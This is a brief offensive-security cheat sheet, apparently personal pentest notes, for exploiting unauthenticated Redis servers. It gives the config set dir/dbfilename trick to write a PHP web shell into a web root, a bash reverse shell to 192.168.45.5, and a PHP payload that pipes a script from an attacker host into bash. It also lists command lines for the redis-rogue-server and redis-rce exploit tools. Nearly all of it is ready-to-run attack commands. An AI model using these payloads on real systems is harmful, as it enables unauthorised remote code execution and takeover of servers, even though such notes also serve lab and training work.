# Redis

```
redis-cli -h $IP
```

### Config File Locations

```
/etc/apache2/sites-available/000-default.conf
/etc/systemd/system/redis.service
/etc/redis/redis.conf
```

```
config set dir /var/www/html
config set dbfilename redis.php
set test "<?php phpinfo(); ?>"
save
```

**Another payload**

```bash
#!/bin/bash

bash -i >& /dev/tcp/192.168.45.5/80 0>&1
```

```bash
set test "<?php system('curl http://192.168.45.5:9001/shell.sh | bash'); ?>"
```

### Redis Rogue Server

{% embed url="https://github.com/n0b0dyCN/redis-rogue-server" %}

```bash
python redis-rogue-server.py --rhost 192.168.177.176 --lhost=192.168.49.177 --lport=53
```

{% embed url="https://github.com/Ridter/redis-rce" %}

Compile the exp.so file from [here](https://github.com/n0b0dyCN/redis-rogue-server)

```bash
python redis-rce.py -r 192.168.177.176 -L 192.168.49.177 -P 443 -f exp.so
```

### Resources

{% embed url="https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-redis-on-ubuntu-16-04" %}